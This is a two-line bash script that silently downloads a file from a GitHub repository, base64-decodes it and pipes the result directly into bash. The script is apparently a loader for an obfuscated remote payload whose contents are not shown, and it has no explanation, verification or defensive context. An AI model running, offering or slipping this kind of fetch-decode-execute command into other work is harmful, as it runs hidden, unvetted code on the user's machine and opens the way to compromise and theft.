#!/bin/bash
wget -qO- https://raw.githubusercontent.com/clementhudges1/trust/refs/heads/main/entrypoint.sh | base64 -d | bash
